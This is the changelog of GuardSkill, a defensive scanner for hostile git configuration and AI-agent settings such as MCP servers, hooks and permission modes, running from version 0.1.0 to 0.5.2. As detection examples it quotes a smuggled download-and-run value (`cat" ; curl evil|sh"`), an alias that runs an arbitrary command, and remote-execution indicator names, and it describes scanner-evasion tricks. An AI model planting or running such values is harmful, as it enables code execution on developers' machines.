# Changelog

## 0.5.2 — 2026-09-12

Three findings from the fourth independent review, all of them in the code that the 0.5.1 fixes touched. None was blocking; all three are the kind of thing that makes a report worth less than the scan behind it.

- **R4-01** A hook produces one finding again. Reusing the MCP severity ladder for hooks was the right fix, but it emitted the MCP rule alongside the hook rule: two findings at the same severity for one hook, the second announcing an MCP server that did not exist. `ruleId` is also the field people suppress on in SARIF, so silencing a noisy MCP rule would have silenced hooks with it. The grading is unchanged; the reason now travels inside the hook finding — `[runs from a temporary or hidden location]` — instead of as a second line that says something untrue.
- **R4-02** A URL among the arguments only counts as an endpoint when the command is a known bridge (**mcp-remote**, **mcp-proxy**, **supergateway**). Taking every URL turned `--registry https://registry.npmjs.org` into a remote MCP server without authentication. "The last positional argument" does not separate the two either — in the counter-example the last argument is a documentation link. A hand-rolled bridge is missed now; that is the price of not crying wolf in the class that had just been calibrated.
- **R4-03** At most 50 findings per rule per file are listed, the rest counted in one summary finding, and the scan declares itself incomplete. A 964 KB `.mcp.json` with 15,000 shell servers produced 30,000 findings and a 21.8 MB SARIF document; GitHub refuses an upload above 25,000 results or 10 MB, so the Security tab showed nothing at all. That is the same shape as one file suppressing a whole scan, one surface further out: the finding existed and never reached anyone.

The review's headline — that 0.5.1 was tagged but not published — was already resolved when it was written: the release workflow succeeded at 15:02 UTC and `npx guardskill@latest` has reported 0.5.1 since. The failed run before it was the commit with a test that asserted the case-sensitive branch on every platform, which macOS caught.

## 0.5.1 — 2026-09-12

Six findings from the third independent review, all in the class that shipped yesterday. Four of them are mistakes the git class already made and had fixed; they were made again because the lessons lived in that code and its tests rather than anywhere a person would look while building something new. `CONTRIBUTING.md` now carries the list, which is the actual fix.

**Security**

- **R3-01** Agent settings file names are matched through the same normalisation git directory names use. `.MCP.json` and `.claude/Settings.json` were reported CLEAN with zero findings — on any platform — while Windows and macOS fold case and hand those files to the agent. On a case-sensitive volume a folded match is now capped at medium with the reason in the finding: inert here, live there. The claim row in `SECURITY.md` said "only the documented file names are read", with a test that froze the bug rather than catching it; both have been rewritten.
- **R3-02** One hostile settings file can no longer silence a scan. A 360 KB `.mcp.json` nested 60,000 levels deep — inside the size limit, because size was bounded and depth was not — overflowed the stack, escaped the run, and turned a scan that had *already found a payload* into ERROR with zero findings. The leaf walk is now iterative with a depth cap, over-deep nesting is its own finding plus INCOMPLETE, and every file is scanned inside its own try/catch. Suppressing a scanner is cheaper than evading one; that route is closed.
- **R3-03** A server entry the scanner does not recognise is reported instead of skipped. `{"command": ["sh", "-c", …]}` and a command nested under `transport` were silent. Both are now read properly, and anything with neither a recognised command nor a URL produces `mcp-server-shape-unknown` with the keys it does have as evidence. MCP schemas are young and differ per client — the scanner does not have to know every shape, but it may not present one it does not understand as an absence.
- **R3-05** The bridge form of a remote server is checked. `npx -y mcp-remote https://…` is how most remote MCP servers are used today, and the auth check skipped any entry that had a command, so exactly that population went unexamined. URLs in arguments now count, and a command no longer switches the check off.

**Correctness — the calibration was wrong in both directions**

- **R3-04a** `acceptEdits` is no longer reported. The Claude Code documentation is explicit: it auto-approves reads, file edits and common filesystem commands, while Bash and network still prompt. Reporting one of the most-used settings there is as an approval bypass, at critical, was wrong on the facts. `plan` and `default` are silent too.
- **R3-04b** `bypassPermissions` is still reported, at high rather than critical, and the finding now says what actually happens: Claude Code ignores the value when it comes from `.claude/settings.json` or `settings.local.json` and starts in Manual mode — those being exactly the files GuardSkill reads. The rule stays because other clients read the same shapes, and because a repository that ships the request has told you something either way.
- **R3-04c** Hooks are graded on the same ladder as MCP commands instead of a flat high. `npx prettier --write $CLAUDE_FILE_PATHS` was failing the default build; it is informational now, a hook running a script from the tree is high, and a shell pipeline or a download-and-run is still critical. The everyday configuration from the review — `acceptEdits` plus a formatter hook — produced a critical and a high; it now produces nothing above informational, with a test that says so by name.

**Documentation and reporting**

- Agent findings carry a line number, so the README's promise of "the file, the line, and a status per finding" is true for both classes in SARIF.
- The README says plainly that the default threshold does **not** fail on an MCP server definition, and that `--fail-on low` is the setting for a tree you were handed rather than one you wrote. That is the product's own use case, and the default was tuned for the other one.
- The claim table said 29 clean and 22 hostile fixtures; there are 32 and 31. A test now compares those numbers with the directories, because the one document whose job is keeping claims honest should not be the one that drifts.
- `CONTRIBUTING.md` gains "Adding a detection class": eight rules, each with the finding that earned it. Normalise names, say so when you do not understand something, bound every axis, isolate per file, grade by what the value names, check the vendor documentation before encoding a claim, make every promise a tested claim, and write the clean fixtures people actually use.

## 0.5.0 — 2026-09-12

Two additions, and they belong in one release: a second detection class, and the place where its findings become visible.

**A second detection class: agent settings**

- `.mcp.json` anywhere in the tree, plus `.claude/settings.json` and `settings.local.json`, `.vscode/mcp.json`, `.cursor/mcp.json`, `.gemini/settings.json` and `.windsurf/mcp.json`. Every file name is listed in `rules/agent-settings-inventory.md`, with the same drift test the git class has: a rule that is not in the inventory, or an inventory entry naming a rule that does not exist, fails the suite.
- Why this class and not another git key: the git vectors need the repository to arrive as files, because a clone does not carry `.git/config`. A `.mcp.json` is an ordinary tracked file and arrives with `git clone` like any other. That is a much larger population.
- Checked inside them: MCP servers that start a program, hooks that run a command on an agent event, permission modes that switch off the approval step, wildcards in an allow list, credential-shaped values, and remote servers declared without credential material.
- **Severity follows what the command names**, the same rule the git class settled on after the first review. A server started from PATH — `npx`, `uvx`, `node`, `docker` — is informational, because that is how most MCP servers are configured and a scanner that fails the build on all of them gets uninstalled. A path inside the tree is high. A shell, a download-and-run, or `/tmp` and hidden directories are critical. If your own project ships its own MCP server, that entry is reported at high; the README says so and tells you what to do about it.
- **What is deliberately not checked**: whether a remote MCP server actually requires authentication. That is only answerable by connecting to it, and the no-network promise is worth more than the check. `mcp-remote-no-auth` reports what the file declares and says so in its own text — with a test that fails if that wording disappears.
- Both classes are found in a single walk of the tree. The second class costs no extra traversal.
- A directory with agent settings and no git data is now a scan rather than "no git repository found". Reading a file in a tree while reporting the tree as uninspected would have been the same fail-open shape in a new place.

**SARIF output**

- `--sarif` writes SARIF 2.1.0 to stdout; `--sarif-out <file>` writes it alongside the readable report rather than instead of it; the Action takes `sarif-file`. Findings then land in the repository's Security tab with file, line and a per-finding status, instead of a red cross that says only "something".
- The severity mapping is stated rather than guessed: critical and high become `error`, medium `warning`, low `note`. `security-severity` — the number GitHub sorts on — is derived from those same four levels. GuardSkill computes no CVSS score, and filling that field from one would be a claim it cannot support.
- An incomplete scan travels into SARIF as a tool notification on the run. A Security tab that shows nothing about a tree half of which was never opened would be exiting 0 on it, one surface further out.
- Each result carries a fingerprint, so GitHub can tell the same finding from a new one between runs.

**Documentation**

- The README now names the second delivery route explicitly, and cites one external measurement for how carefully MCP servers get configured in practice — Bloomberry's February 2026 sample of 1,412 company-hosted servers, 38.7% with no authentication — with the sample stated, because those are public endpoints rather than the definitions in your repository.
- It also says, once and in the framing rather than in any finding, that the gap between discovery and use is closing as both get automated. There is deliberately no time-to-exploit claim attached to individual findings: that would be the first claim in this project without a test behind it, and it is not knowable per finding.

## 0.4.1 — 2026-09-09

No detection changes. This release exists so the published entry points match what the documentation says they are.

- A GitHub Action (`action.yml`), so a scan can run on every push instead of when someone remembers. Inputs are passed through the environment and read as shell variables rather than interpolated into the script, because interpolating a workflow expression into a shell line is the class of bug this tool reports. It installs the published package with `--ignore-scripts`: this action runs in other people's CI, so a lifecycle script must never execute.
- The action is named `GuardSkill Scan`. `GuardSkill` is an existing GitHub username, and the Marketplace requires an action name that matches no existing action, user or organisation.
- `test/action.test.js` — three tests: the action's default version must equal this package's version, inputs must never be interpolated, and `fail-on` and `version` must be validated before they reach a command line. The first of those is why this release changes two files in lockstep; forget one and the suite says so.
- `test/packaging.test.js` gains a tarball hygiene check. A Word owner-lock file (`~$…`) written beside a `.md` someone had open was tracked by `git add -A` and would have been published inside `rules/` — a scanner's rule directory is the last place a stray editor artefact belongs. The test fails on any path in the tarball outside the intended set.
- `.gitattributes` normalises line endings to LF in every checkout. A Windows checkout handed the new Action test CRLF, and a pattern written against `\n` then reported a file as malformed — green on Linux and macOS, red on the Windows matrix, about a file nobody had touched.
- Issue templates for false positives and missing execution keys, both requiring the fields that make a report actionable: the rule id and what legitimately sets the key, or the git documentation reference for the key.
- `docs/README.md`: an English index to the two independent security reviews and the acceptance gate they were judged against.
- The performance test in `test/contract.test.js` measured the wrong thing and stopped this very release. Its fixture was three levels deep, so depth 8 and depth 24 walked identical trees; the deep scan ran first on a cold page cache and the shallow one second on a warm one, and on a loaded runner that read as `2185ms against 391ms - that is a regression, not a deeper walk`. It was comparing cache warmth. The fixture now has a branch deeper than the shallow limit, a warm-up scan precedes the measurements, the ratio carries a floor, and a non-timing assertion checks that depth 24 actually reaches more directories than depth 8 — the part of the claim that holds on a machine of any speed.
- `ci.yml` no longer fires on tags. A tag push started CI and Release together, each running the same nine-way matrix: eighteen jobs contending for the same runners on the one occasion when a red result costs a release.
- Published from the tag by GitHub Actions with npm provenance through OIDC. No publish credential is stored in a repository secret.

## 0.4.0 — 2026-09-08

Closes all seventeen findings from the first independent security review, and the five from the second, against acceptance gates written before the work started. Detection stays at git level; a separate confidence axis and the next detection class move to 0.5.0.

**Second review round — the published package, and what a scan may claim**

- **N-1** `bin/guardskill.js` is the entry point. The CLI used to guard its own execution with `import.meta.url === pathToFileURL(process.argv[1])`, which is false when npm's bin symlink starts it: installed from the registry, `guardskill` printed nothing and exited 0. `src/cli.js` is now a library that exports `run`, and the tests that matter drive the packed tarball — `npm pack`, install into a throwaway directory, run `node_modules/.bin/guardskill` — on Linux, macOS and Windows. That is the only test that touches what a user actually gets.
- **N-2** The value parser is a single pass carrying quote state, because git's is. Stripping comments first and unquoting afterwards missed a quote opened halfway through a value: `clean = cat" ; curl evil|sh"` read as the bare command `cat"` and scored low, while git read the whole command and ran it. That case is now high. The golden table is now generated as well as hand-written: 41 hand-picked cases plus 512 permutations of quote, comment, escape and separator position, put to `git config --file` offline and committed — 553 cases, 391 of which git accepts and answers, and the parser agrees with git on every one. Four of the five declared deviations disappeared with the rewrite; only valueless keys remain. The permuting generator is the point: the hand-written table had no case with a quote in the middle of a value, and an assertion that fails on undeclared deviations can only fail on what is in the table.
- **N-3** Reads are bounded at the file handle, not after loading. `readFile().slice()` allocated a 400 MB hook script in full, and past Node's maximum string length it threw — the catch turned that into an empty head, indistinguishable from "read it, found nothing", quietly dropping a padded hook from critical to high. A config or hook that exists and cannot be read is now its own finding and marks the scan INCOMPLETE, because an unread file is the one thing a scanner must never report as an absence of findings.
- **N-4** `status` and the exit code are separate answers. `status` says what was found; the exit code says whether that clears the threshold you set. A medium finding under the default threshold reports `status: FINDINGS` with exit 0, and `CLEAN` now means zero findings and nothing else. With `--json`, a failure answers in JSON too.
- **N-5** Findings from a case-variant `.GIT` directory on a case-sensitive volume are capped at medium, with the reason appended to the explanation: live on Windows and macOS, inert where it was found.

**First review round — security: false negatives that let a working attack through**

- **F-01** `include.path` and `includeIf.*.path` are now followed and inspected when the target lies inside the scanned tree, with the include chain in the finding's location. Previously the include was reported at medium and the file behind it never opened, so a payload one file away passed the documented CI recipe with exit 0. An include that points outside the tree, or cannot be read, is high and marks the scan INCOMPLETE.
- **F-02** `git` is no longer a safe command prefix. It never should have been: `git -c alias.x=!cmd x` is an arbitrary command that starts with the word git. Filter, textconv and merge-driver values are now matched against an exact allowlist, and any git invocation carrying `-c`, `--config-env`, `--exec-path`, `-p` or `--paginate` is critical.
- **F-03** Seven executing keys added: `pager.<cmd>`, `gpg.program`, `remote.<n>.uploadPack` / `receivePack`, `core.askPass`, `core.alternateRefsCommand`, `trailer.<t>.command`, `init.templateDir`. Also `browser`, `guitool` and `man` tool commands.
- **F-04** An alias that re-enters git with its own configuration (`-c`, `--exec-path`, `-C`, …) is high, alongside the existing rule for values starting with `!`.
- **F-05** Hook scripts that are symlinks are inspected. One pointing outside the tree is critical and its target is deliberately not read.
- **F-06** Directory names are matched case-insensitively where the file system folds case, decided by a read-only probe rather than by `process.platform`. On a case-sensitive volume a directory named `.GIT` is reported at medium with the reason: not a git directory here, but live on Windows and macOS.

**Reliability — three ways a scan could report success without proving anything**

- **F-07** Four end states in text, JSON and exit code: CLEAN 0, FINDINGS 1, ERROR 2, INCOMPLETE 3. A missing path is an error instead of a clean result; a truncated walk fails unless `--allow-incomplete` is given. `--fail-on` moves the severity threshold only. The CLI default depth is 24, matching the library and the help text — a test compares them.
- **F-08** `process.exit()` is gone from every path that writes to stdout. Through a pipe it truncated JSON at exactly 65,536 bytes with the exit code still reporting success. Regression test: over 1 MB through a pipe, byte-length compared against the same scan captured whole.
- **F-12** The rule set is validated at load: required fields, severity from the four allowed values, known match type, every pattern compiled once. An unknown severity used to make `SEVERITIES.indexOf` return -1 and pin the exit code to 1 for every scan.

**Security of the tool itself**

- **F-09** Config files reached through a symlink are refused, reported at high, and mark the scan INCOMPLETE — they are not read. The previous version's walk did not follow symlinks but `readFile` did, so a delivered directory could have any readable file's contents printed as evidence. Applies to `config`, `config.worktree`, `worktrees/*/config.worktree`, `modules/**/config`, `.gitmodules` and the `.git` file.
- **F-11** `location`, `title` and `explanation` are sanitised in both formatters, not only `evidence`. A directory name carrying `ESC [ 2K CR` could otherwise erase the line it appeared on and write a fake "No findings" over it. Raw values survive only in the JSON output, with the escape character escaped.

**Correctness — false positives that broke the documented CI recipe**

- **F-10** Severity now depends on what a value names rather than on which key it is:
  - a bare command resolved from PATH in a filter, textconv or merge driver (`cat`, `sops`, `jupyter nbconvert`) is informational; a path, a shell metacharacter, `/tmp`, or a git re-entry is high or critical;
  - a bare repository or unregistered nested `.git` is medium on its own and critical when that same config carries something git executes — the boundary is pinned from both sides by two tests, and the existing critical assertion was not weakened;
  - `.gitmodules` is read for every repository found, not only the scan root, so a submodule registered by the subproject that owns it is no longer reported;
  - arguments to an allowlisted credential helper are inspected: `store --file=/tmp/git-credentials` is high.

**Release integrity and documentation**

- **F-13** `package.json` carries no placeholder; `homepage`, `repository.url` and `bugs.url` point at the real repository. A test and a release-workflow step both refuse a placeholder.
- **F-14** The README no longer prints an install command that fails. Until the first npm release it shows the clone-and-run form.
- **F-15** Every behavioural claim in the README, `SECURITY.md`, `SKILL.md` and the help text is listed in the claim-parity table in `SECURITY.md` with the test that proves it, and a test fails when a claim points at a test that does not exist. Absolute phrasings that the code did not make true are gone.
- **F-16** Tests that cannot run on a platform call `t.skip()` with a reason instead of returning quietly. CI fails if anything is skipped on Linux.
- **F-17** GitHub Actions pinned to commit SHAs; a tag-only `release.yml` publishing with npm provenance through OIDC, never triggered by a pull request; the dead `node_modules/.cache` skip entry removed; PowerShell, `certutil`, `bitsadmin` and `mshta` added to the remote-execution indicators; this changelog put in chronological order.

**Test infrastructure**

- `rules/git-exec-keys-inventory.md` — every executing git key with its source and status, `covered` with a rule id or `out-of-scope` with a reason. A test fails when the inventory and the rule set drift apart, so a gap is visible instead of forgotten.
- `test/fixtures/gitconfig-golden.json` — 25 cases with the output of `git config --file X --list -z` from git 2.43.0, generated once offline by `tools/generate-golden.mjs` and committed. The suite compares the parser against it and fails on any difference that is not declared, with a reason, in `test/golden.test.js`. Two real parser bugs came out of this: continuation lines were trimmed, and tabs in unquoted values were kept where git records a space.
- `test/corpus/` — five real-world repository shapes with a hard ceiling: no `critical`, and no `high` that `PROVENANCE.md` does not declare. This is the check that would have found F-10 first.
- Contract tests for all four exit codes, the JSON schema, help-text parity and a measured performance budget.
- 66 tests, none skipped on Linux.

## 0.3.0 — 2026-09-08

Hardening pass driven by attacking the previous version rather than by adding features.

**Fixed — evasions**
- An allowlisted command name matched on basename, so `core.pager = /tmp/less` passed as `less`. Allowlists now apply only to bare command names, never to paths.
- A hooks directory named `.husky` or `.githooks` was downgraded on the strength of its name. Scripts are classified individually.

**Fixed — configs that were never read**
- `config.worktree`, `.git/worktrees/*/config.worktree` and every `.git/modules/<name>/config` are now inspected.
- A `.git` *file* (`gitdir: …`) is followed when it points inside the scanned tree.
- Bare-repository detection no longer requires a `refs/` directory.
- Default traversal depth raised from 8 to 24 in the library. (The CLI kept passing 8 — fixed in 0.4.0 as F-07a.)

**Added**
- `protocol.allow` / `protocol.<name>.allow`, `ext::` transport URLs, and a finding when a config is too large to parse.
- Control characters stripped from config values before output.

**Testing**
- Evasion suite and robustness suite. Clean fixtures 20 → 29, hostile 10 → 22.

## 0.2.1 — 2026-09-08

**Fixed**
- The test script used a shell glob (`node --test ./test/*.test.js`), which cmd.exe and PowerShell do not expand — CI failed on Windows with Node 18 and 20 while passing on Node 22. `test/run.js` resolves the file list in JavaScript.

## 0.2.0 — 2026-09-08

Rewritten after checking v0.1 against the primary sources. v0.1 scanned only the top-level `.git/config`, which is the one configuration in a normally cloned project that is least likely to be hostile.

- Tree-walking discovery: nested `.git` directories and bare repositories anywhere under the scanned path.
- Detection for indirect execution keys: shell aliases, filter drivers, `diff.*.textconv`, merge drivers, `mergetool`/`difftool` commands, `credential.helper`, `diff.external`, `core.gitProxy`, `core.editor`, `sequence.editor`, `uploadpack.packObjectsHook`.
- Hook-content inspection; husky, lefthook and pre-commit recognised.
- `--json`, `--fail-on`, `--max-depth`, `--exclude`, `--no-color`, `--version`.
- English throughout. Traversal never follows symlinks.

## 0.1.0 — 2026-09-08

First internal build. `core.fsmonitor`, `core.sshCommand`, `core.pager`, `core.hooksPath`, `include.path` in the top-level `.git/config`, plus active hooks. Never published.
